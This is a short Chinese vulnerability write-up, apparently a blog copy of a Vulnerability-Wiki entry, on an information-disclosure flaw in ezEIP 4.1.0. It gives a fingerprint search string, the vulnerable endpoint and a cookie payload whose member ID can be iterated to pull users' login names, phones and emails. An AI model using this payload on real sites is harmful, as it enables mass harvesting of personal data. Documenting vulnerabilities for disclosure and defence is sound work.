---
title: "ezEIP 4.1.0 信息泄露漏洞"
date: 2026-10-12 09:01:19
categories:
  - WebSecurity
  - CVE
  - "cms"
  - "ezEIP"
tags:
  - "ezEIP"
  - "信息泄露"
  - "漏洞复现"
---
## 漏洞描述

ezEIP 4.1.0 存在信息泄露漏洞，通过遍历Cookie中的参数值获取敏感信息

## 漏洞影响

```
ezEIP 4.1.0
```

## 网络测绘

```
"ezEIP"
```

## 漏洞复现

漏洞Url为

```plain
/label/member/getinfo.aspx
```

访问时添加Cookie（通过遍历获取用户的登录名电话邮箱等信息）

```plain
WHIR_USERINFOR=whir_mem_member_pid=1;
```

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/202202162312106.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/cms/ezEIP-4.1.0-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md)
